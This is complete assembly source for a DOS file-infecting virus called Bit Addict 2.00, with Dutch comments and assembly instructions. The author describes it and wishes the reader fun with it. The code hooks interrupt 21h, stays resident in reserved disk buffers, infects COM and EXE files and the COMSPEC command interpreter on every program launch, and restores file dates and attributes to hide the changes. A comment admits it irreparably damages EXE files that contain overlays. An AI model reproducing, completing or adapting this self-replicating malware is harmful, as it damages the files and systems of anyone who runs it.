; BIT ADDICT Versie 2.00
;
; Dit virus besmet exe en com-files, en als het opgestart wordt dan reserveert
; hij 2 diskbuffers en copieert het virus daarheen om resident te blijven.
; Als het virus resident is dan gaat hij in de environment naar de comspec
; zoeken en besment dan de command interpreter (meestal COMMAND.COM).
; Om dit virus te assambleren moet je met TASM, of MASM een OBJ-file maken en
; dan linken naar een exe-file. Wees voorzichtig en veel plezier met dit virus.

; p.s. wil je dit virus nog aan NIEMAND geven zonder mijn toestemming, omdat
; het virus nog niet helemaal af is, en waarschijnlijk ook niet helemaal zonder
; fouten.

;-----------------------------------------------------------------------------
;-----                                                                   -----
;-----              Macros en andere hulpmiddellen                       -----
;-----                                                                   -----
;-----------------------------------------------------------------------------

; de macro's hieronder worden gebruikt wanneer een conditionele sprong groter
; wordt dan 128 bytes en er dus een foutmelding komt

jmpc	macro	Dest			; vervanging voor jc
	local	@@00

	jnc	@@00
	jmp	Dest
@@00:
	endm

jmpnc	macro	Dest			; vervanging voor jnc
	local	@@00

	jc	@@00
	jmp	Dest
@@00:
	endm

jmpe	macro	Dest			; vervanging voor je
	local	@@00

	jnz	@@00
	jmp	Dest
@@00:
	endm

jmpne	macro	Dest			; vervanging voor jne
	local	@@00

	jz	@@00
	jmp	Dest
@@00:
	endm

eseg segment
	mov	ax,4c00h		; exit
	int	21h
eseg ends

;-----------------------------------------------------------------------------
;-----                                                                   -----
;-----              Begin van het Bit Addict virus                       -----
;-----                                                                   -----
;-----------------------------------------------------------------------------

cseg segment
	assume	cs:cseg,ds:cseg,es:cseg
	org	0

BeginCode	equ	$
SavedCode	equ	this byte		; gegevens over het
OldSignature	dw	5a4dh			; programma voor het virus
OldCSIP		equ	this dword
OldIP		dw	0
OldCS		dw	0
OldSP		dw	200h
OldSS		dw	0
		dw	3 dup(0)

Comspec		db	'COMSPEC='		; comspec environment variabele
						; om de command.com te vinden
ID		db	'BIT ADDICT 2.00'	; identificatie string
ID_Length	equ	$-offset ID

Begin:	push	ax				; Programma om het virus
	push	bx				; in het geheugen te zetten
	push	cx
	push	dx
	push	si
	push	di
	push	ds
	push	es
	push	cs
	pop	ds
	cmp	OldSignature,5a4dh
	je	@@10
	mov	si,offset SavedCode		; herstel begin van het
	mov	di,100h				; com-programma
	mov	cx,10h
	cld
	rep	movsb
	mov	OldSS,ss			; bewaar de waarden van
	mov	OldSP,sp			; ss,sp,cs en ip
	sub	OldSP,10h
	mov	OldCS,es
	mov	OldIP,100h
	jmp	@@11
@@10:	mov	ax,es				; bereken de waarden van
	add	ax,10h				; ss,sp,cs en ip
	add	OldCS,ax
	add	OldSS,ax
@@11:	mov	ax,4b40h			; controleer of Bit Addict al
	int	21h				; in het geheugen aanwezig is
	jc	@@12
	mov	ds,ax
	push	cs				; vergelijk identificatie
	pop	ds
	mov	si,offset ID
	mov	di,si
	mov	cx,ID_Length
	cld
	repe	cmpsb
	jmpne	@@13
@@12:	mov	ah,52h				; lees het adres van de eerste
	int	21h				; disk-buffer
	push	bx
	mov	ah,30h
	int	21h
	pop	di
	cmp	al,2				; dit werkt niet op dos 1.x
	jmpc	@@13
	cmp	al,3				; voor dos 2.x op 13h en voor
	adc	di,12h				; dos 3+ op 12h
	lds	si,es:[di]
	or	si,si
	jne	@@13
	push	di
	movsw					; reserveer 1e buffer
	movsw
	pop	di
	mov	cx,ds
	mov	dx,ds
	call	GetBuffer			; reserveer 2e buffer 
	jc	@@13
	call	CopyBitAddict			; Copieer bit addict naar
	pop	es				; de buffers
	push	es				; Infecteer bestand in de
	call	InfectComspec			; comspec
	jmp	@@14
@@13:	call	RestoreBuffers
@@14:	pop	es				; ga nu verder met het
	pop	ds				; programma voor Bit Addict
	pop	di
	pop	si
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	cli
	mov	ss,cs:OldSS
	mov	sp,cs:OldSP
	sti
	jmp	cs:OldCSIP

GetBuffer:				; reserveer een buffer
	push	di			; cx = eerste buffer
	push	es			; dx = laatste buffer
	jmp	@@21
@@20:	push	ds
	pop	es
	mov	di,si
@@21:	lds	si,es:[di]
	or	si,si
	jne	@@23
	mov	ax,ds
	sub	ax,dx
	cmp	ax,21h
	jne	@@22
	mov	dx,ds
	movsw
	movsw
	clc
	jmp	@@24
@@22:	mov	ax,ds
	sub	ax,cx
	neg	ax
	cmp	ax,21h
	jne	@@20
	mov	cx,ds
	movsw
	movsw
	clc
	jmp	@@24
@@23:	stc
@@24:	pop	es
	pop	di
	ret

CopyBitAddict:
	push	cs				; copieer Bit Addict naar de
	pop	ds				; gereserveerde buffers
	mov	es,cx
	xor	si,si
	xor	di,di
	mov	cx,CodeSize1
	cld
	rep	movsb
	mov	ds,ax				; leid interrupt 21h om naar
	mov	ax,ds:[84h]			; Bit Addict
	mov	word ptr es:OldInt21[0],ax
	mov	ax,ds:[86h]
	mov	word ptr es:OldInt21[2],ax
	mov	word ptr ds:[84h],offset NewInt21
	mov	word ptr ds:[86h],es
	ret

InfectComspec:
	mov	es,es:[2ch]			; lees environment segment
	xor	di,di
	push	cs				; zoek naar de comspec
	pop	ds				; variabele
	mov	si,offset Comspec
@@30:	push	si
	push	di
	mov	cx,8
	cld
	repe	cmpsb
	pop	di
	pop	si
	je	@@31
	xor	al,al
	mov	cx,-1
	cld
	repne	scasb
	cmp	byte ptr es:[di],0
	jne	@@30
	jmp	@@32
@@31:	push	es				; infecteer de COMMAND.COM of
	pop	ds				; andere command interpreter
	lea	dx,[di+8]
	push	cs:OldIP
	push	cs:OldCS
	push	cs:OldSP
	push	cs:OldSS
	call	Infect
	pop	cs:OldSS
	pop	cs:OldSP
	pop	cs:OldCS
	pop	cs:OldIP
@@32:	ret

RestoreBuffers:
	mov	ax,cx
@@40:	cmp	ax,dx
	je	@@42
	mov	ds,ax
	add	ax,21h
	mov	word ptr ds:[0],0
	mov	word ptr ds:[2],ax
	jmp	@@40
@@42:	mov	ds,dx
	mov	ax,es:[di]
	mov	ds:[0],ax
	mov	word ptr es:[di],0
	mov	ax,es:[di+2]
	mov	ds:[2],ax
	mov	es:[di+2],cx
	ret

NewInt21:					; Het nieuwe interrupt 21h
	pushf
	cmp	ax,4b40h
	je	InstallCheck
	cmp	ah,4bh
	je	Exec
EOI:	popf
	jmp	cs:OldInt21

InstallCheck:					; Zo kan bit addict weten
	mov	ax,cs				; dat er al een andere copy
	popf					; aanwezig is
	clc
	retf	2

ComHeader:					; dit stukje wordt voor een
	mov	ax,cs				; COM-file geplaatst
	add	ax,0100h
OldSize	equ	this word-2
	push	ax
	mov	ax,offset Begin
	push	ax
	retf

Exec:	call	Infect				; functie 4bh, infecteer eerste
	jmp	EOI				; met Bit Addict

Infect:	push	ax				; Infecteer een file
	push	bx
	push	cx
	push	si
	push	di
	push	bp
	push	es
	mov	ax,4300h			; lees attributen en bewaar
	int	21h				; ze
	jmpc	@@62
	push	cx
	push	dx
	push	ds
	test	cx,1
	jz	@@51
	mov	ax,4301h			; set Read-Only attribuut
	and	cx,0fffeh			; op nul
	int	21h
	jmpc	@@61
@@51:	mov	ax,3d02h			; open de file
	int	21h
	jmpc	@@61
	mov	bx,ax
	mov	ax,5700h			; lees de datum en tijd en
	int	21h				; bewaar ze
	jmpc	@@60
	push	cx
	push	dx
	push	cs				; ds=es=cs
	pop	ds
	push	cs
	pop	es
	mov	ah,3fh				; lees de header van de file
	mov	cx,HeaderLength
	lea	dx,Header
	int	21h
	jmpc	@@59
	cmp	ax,HeaderLength
	jne	@@54
	cmp	Signature,5a4dh
	jne	@@52
	mov	ax,ExeCS			; zoek de plaats waar de 
	add	ax,HeaderSize			; identificatie zou moeten
	mov	dx,10h				; staan voor exe-files
	mul	dx
	add	ax,offset ID
	adc	dx,0
	jmp	@@53
@@52:	mov	ax,ComCS			; doe hetzelfde maar dan voor
	mov	dx,10h				; een com-file
	sub	ax,dx
	mul	dx
	add	ax,offset ID
	adc	dx,0
@@53:	mov	cx,dx
	mov	dx,ax
	mov	ax,4200h
	int	21h
	mov	ah,3fh				; lees de ID indien aanwezig
	mov	cx,ID_Length
	lea	dx,ID_Check
	int	21h
	lea	si,ID_Check			; controleer of ID aanwezig
	lea	di,ID				; is
	mov	cx,ID_Length
	cld
	repe	cmpsb
	jmpe	@@59				; als ID aanwezig is, stop dan
	cmp	Signature,5a4dh
	je	@@56
@@54:	mov	ax,4202h			; infecteer com-files
	xor	cx,cx				; ga naar het einde van de file
	xor	dx,dx
	int	21h
	mov	cx,10h				; aanpassen van de com-header
	div	cx				; aan deze com-file
	or	dx,dx
	je	@@55
	push	ax
	mov	ah,40h
	mov	cx,10h
	sub	cx,dx
	xor	dx,dx
	int	21h
	pop	ax
	jmpc	@@59
	inc	ax
@@55:	add	ax,10h
	mov	OldSize,ax
	mov	si,offset Header		; bewaar het eerste deel van
	mov	di,offset SavedCode		; het programma
	mov	cx,10h
	cld
	rep	movsb
	mov	ah,40h				; schrijf het virus achter het
	mov	cx,CodeSize1			; programma
	xor	dx,dx
	int	21h
	jmpc	@@59
	mov	ax,4200h			; ga naar het begin van de file
	xor	cx,cx
	xor	dx,dx
	int	21h
	jmpc	@@59
	mov	ah,40h				; overschrijf het begin van het
	mov	cx,10h				; programma met de com-header
	mov	dx,offset ComHeader
	int	21h
	jmp	@@59
@@56:	mov	OldSignature,5a4dh		; infecteer exe-files
	mov	ax,ExeIP			; bewaar de oude waarden van
	mov	OldIP,ax			; cs:ip en ss:sp
	mov	ax,ExeCS
	mov	OldCS,ax
	mov	ax,ExeSP
	mov	OldSP,ax
	mov	ax,ExeSS
	mov	OldSS,ax
	mov	ax,PageCount			; pas de waarden van cs:ip en
	dec	ax				; ss:sp aan, en pas ook de 
	mov	cx,200h				; lengte van de file aan
	mul	cx
	add	ax,PartPage
	adc	dx,0
	mov	cx,dx
	mov	dx,ax
	mov	ax,4200h
	int	21h
	mov	cx,10h
	div	cx
	or	dx,dx
	je	@@57
	push	ax
	push	dx
	mov	ah,40h
	mov	cx,10h
	sub	cx,dx
	xor	dx,dx
	int	21h
	pop	dx
	pop	ax
	jc	@@59
	inc	ax
@@57:	sub	ax,HeaderSize
	mov	ExeCS,ax
	mov	ExeIP,offset Begin
	add	ax,CodeSizePara2
	mov	ExeSS,ax
	mov	ExeSP,200h
	mov	ax,MinMem
	cmp	ax,20h+CodeSizePara2-CodeSizePara1
	jae	@@58
	mov	ax,20h
@@58:	mov	MinMem,ax
	mov	ax,PartPage
	add	ax,CodeSize1
	add	ax,dx
	mov	cx,200h
	xor	dx,dx
	div	cx
	add	PageCount,ax
	mov	PartPage,dx
	mov	ah,40h				; schrijf het virus achter
	mov	cx,CodeSize1			; de exe-file, indien de
	xor	dx,dx				; exe-file overlays bevat dan
	int	21h				; worden ze overschreven en is
	jc	@@59				; de exe-file onherstelbaar
	mov	ax,4200h			; beschadigd
	xor	cx,cx
	xor	dx,dx				; ga naar het begin van de file
	int	21h
	jc	@@59
	mov	ah,40h				; schrijf de nieuwe exe-header
	mov	cx,HeaderLength			; over de oude heen.
	mov	dx,offset Header
	int	21h
@@59:	pop	dx				; herstel de datum van de file
	pop	cx
	mov	ax,5701h
	int	21h
@@60:	mov	ah,3eh				; sluit de file
	int	21h
@@61:	pop	ds				; herstel de attributen van de
	pop	dx				; file
	pop	cx
	test	cx,1
	jz	@@62
	mov	ax,4301h
	int	21h
@@62:	pop	es				; herstel de waarden van de
	pop	bp				; registers en keer terug
	pop	di				; naar het oude interrupt 21
	pop	si
	pop	cx
	pop	bx
	pop	ax
	ret

CodeSize1	equ	$-BeginCode
CodeSizePara1	equ	($-BeginCode+0fh) / 10h

Header		dw	14h dup(?)
ComCS		equ	Header[ComHeader-OldSize]	; Com file

Signature	equ	Header[0h]			; Exe file
PartPage	equ	Header[2h]
PageCount	equ	Header[4h]
ReloCount	equ	Header[6h]
HeaderSize	equ	Header[8h]
MinMem		equ	Header[0ah]
MaxMem		equ	Header[0ch]
ExeSS		equ	Header[0eh]
ExeSP		equ	Header[10h]
ChkSum		equ	Header[12h]
ExeIP		equ	Header[14h]
ExeCS		equ	Header[16h]
TablOfs		equ	Header[18h]
OverlayNr	equ	Header[1ah]
HeaderLength	equ	1ch

ID_Check	db	ID_Length dup(?)

OldInt21	dd	?

CodeSize2	equ	$-BeginCode
CodeSizePara2	equ	($-BeginCode+0fh) / 10h

cseg ends

sseg segment stack
	db	200h dup(?)
sseg ends

end Begin